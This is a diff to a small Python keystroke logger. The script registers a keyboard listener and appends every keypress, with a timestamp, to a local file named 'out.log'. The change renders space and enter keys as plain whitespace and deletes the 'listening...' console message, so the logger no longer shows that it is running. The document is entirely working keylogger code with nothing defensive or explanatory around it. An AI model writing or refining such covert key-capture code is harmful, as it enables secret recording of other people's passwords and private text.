@@ -19,11 +19,13 @@ def on_press(key):
         append(output_path, f"{k}") 
     except:
         k = key.name
-        append(output_path, f"[{k}]") 
+        if k == 'space': text = " "
+        elif k == 'enter': text = "\n"
+        else: text = f"[{k}]"
+        append(output_path, text)
 
 output_path = "out.log"
 listener = keyboard.Listener(on_press=on_press)
-print("listening...")
 current_dt = dt_now()
 append(output_path, f"{current_dt}\n")
 listener.start()
